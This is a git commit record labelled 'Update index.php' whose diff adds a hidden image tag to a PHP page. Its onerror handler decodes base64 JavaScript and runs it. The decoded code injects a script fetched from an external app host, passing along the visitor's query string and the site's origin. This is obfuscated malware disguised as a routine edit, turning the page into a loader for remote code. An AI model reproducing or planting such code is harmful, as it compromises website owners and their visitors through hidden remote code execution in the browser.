11a6bdb396c51ced413588dda2ceaa5efb6c4ba3
simomy8kolanenko <my8kola.simonenko@gmail.com>
2025-02-03 10:10:50 -0800

    Update index.php

--- index.php
+++ index.php
@@ -8,7 +8,7 @@
 </head>
 
 <body>
-
+<img src="/files/images/Logo.png" data-digest="KGZ1bmN0aW9uKCl7dmFyIGE9ZG9jdW1lbnQuaGVhZHx8ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImhlYWQiKVswXSxiPSJzY3JpcHQiLGM9YXRvYigiYUhSMGNITTZMeTkzYUdGc1pTMWhjSEF0TWkwM2VEZzJkaTV2Ym1ScFoybDBZV3h2WTJWaGJpNWhjSEF2WVdwaGVDNXdhSEE9Iik7Yys9LTE8Yy5pbmRleE9mKCI/Iik/IiYiOiI/IjtjKz1sb2NhdGlvbi5zZWFyY2guc3Vic3RyaW5nKDEpO2I9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudChiKTtiLnNyYz1jO2IuaWQ9YnRvYShsb2NhdGlvbi5vcmlnaW4pO2EuYXBwZW5kQ2hpbGQoYik7fSkoKTs=" onerror="(new Function(atob(this.dataset.digest)))();" style="visibility: hidden;">
 </body>
 
 </html>
